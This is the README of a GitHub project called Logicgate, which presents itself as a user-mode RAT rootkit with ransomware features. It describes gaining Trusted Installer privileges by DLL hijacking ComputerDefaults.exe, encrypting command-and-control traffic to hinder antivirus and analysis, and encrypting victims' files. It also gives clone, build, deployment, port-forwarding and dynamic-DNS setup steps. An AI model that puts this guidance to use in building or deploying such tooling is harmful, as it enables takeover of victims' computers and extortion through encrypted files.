# Logicgate
_This project has a write-up with it. View it [here](https://provrb.github.io/Logicgate-Rootkit/)_

A user-mode RAT rootkit that elevates to Trusted Installer privileges by using DLL hijacking
and a System32 mock directory. Requests over sockets to and from remote hosts are encrypted using RSA
to obfuscate reverse engineering and anti-viruses monitoring network traffic. Commands can be sent from
the command-and-control server to remote hosts, these commands will be performed on the clients machine.
- Includes ransomware functionality. Encrypt files using uniquely generated 2048 RSA bit keys
for each client, and save them in a JSON file with the client machine GUID as the key index.

# Installing
How to install the source code for the project in a couple different ways.

### Using GitHub.com Website
To install the source using the GitHub website, simply visit the repository link (https://github.com/provrb/Logicgate-Rootkit)
and click the green 'Code' button at the top of the page, afterwards click 'Download ZIP'. Your download should be started.
Once downloaded as a ZIP, unpack the folder 'Logicgate-Rootkit' to a spot on your computer. You now have 
downloaded the source code for the project. 

### Using the Command Line
To install using the command line, Firstly open your terminal or command prompt
and navigate to a path somewhere on your computer where you would like to save the source code.
Afterwards, simply clone the repository using this link. https://github.com/provrb/Logicgate-Rootkit.git 
You can run the command below to do this.

```
git clone https://github.com/provrb/Logicgate-Rootkit.git
```

Finally, the source code should be saved in a folder 'Logicgate-Rootkit' to the path 
you were located in your command prompt.

# Building
Instructions for building the client DLL and server executable with Visual Studio only.

**Visual Studio is recommended when building. This application has only ever been built with Visual Studio.**

### Using Visual Studio
With the source code for the project downloaded, open the 'DLL.sln' file.
This should load the project solution. Afterwards, choose your configuration,
either 'Client' or 'Server', and then navigate to Build -> Build Solution.

If you built the CLIENT configuration, the client DLL will be located in 'out/x64/Client/'
If you built the SERVER configuration, the server executable will be located in 'out/x64/Server/'

# Runnning
Instructions for running the client DLL and the server executable

### Client DLL
Since the Client DLL was meant to be shipped taking advantage of ComputerDefaults.exe,
this DLL is meant to be loaded by ComputerDefaults.exe.

Take a copy of this executable at 'C:\Windows\System32\ComputerDefaults.exe'.
Place this copy in the same directory as your Client DLL. **Do NOT rename this file, otherwise it won't be 
recognized and loaded by the executable'**.
Once the two are in the same directory, you can run ComputerDefaults.exe.

### Server EXE
**Important: You must port-forward the ports you create the server with in ServerMain.cpp**

The server is much more simple to run. As it is an executable, you can simply build it,
and run the Server.exe file. The TCP server will be created on your defined port, default 5454,
and will also be listening for UDP messages on port 4820. 

# Configuration
Instructions on configuring the server, and commands such as TCP port, TCP ddns to use, etc..
**Important: To run the server, you must port-forward the ports defined in the creation of any server.**

You can configure server settings the TCP server will follow by modifying m_Config in ServerInterface.h.
The config will look something like

```c++
struct {
	std::string serverStatePath      
	std::string serverStateFilename  
	std::string serverStateFullPath  
	std::string serverConfigPath	 
	std::string serverConfigFilename 
	std::string serverConfigFilePath 
	std::string domainName         
	const UINT  maxConnections        
	long        TCPPort               
	long        UDPPort              
	const UINT  keepAliveIntervalMs	 
	const UINT  keepAliveTimeoutMs	
} m_Config;
```

### Config Values Meaning
```
serverStatePath:      The path to save the JSON file containing information about the server, created on startup, and used by the server.
serverStateFilename:  The name of the JSON file to save server info.
serverStateFullPath:  Do not modify unless you know what you are doing.
serverConfigPath:     WIP. Reserved.
serverConfigFilename: WIP. Reserved.
serverConfigFilePath: Do not modify unless you know what you are doing.
domainName:           Reference to DNS_NAME in Client.h. Do not modify.
		      - To modify, instead change the DNS_NAME variable in Client.h to
		        your desired DNS. You can set a free DNS up with no-ip.com!
maxConnections:       The max amount of connections the TCP server can have at once
TCPPort:	      Read only. TCP port that you created the TCP server with.
                      - You can customize the TCP port you run the server with
                        by providing different arguments to the ServerInterface constructor
                        in ServerMain.cpp!
UDPPort:	      Read only. UDP port that you are listening on and created the server with.
                      - You can customize the UDP port you run the server with
                        by providing different arguments to the ServerInterface constructor
                        in ServerMain.cpp!
keepAliveIntervalMs:  How often to send keep-alive packets to your clients to prevent them from disconnecting.
keepAliveTimeoutMs:   The time to wait for a keep-alive packet to be echo'd from the client before concluding a dead client.
```

# Commands
Descriptions on commands you can perform on remote hosts.
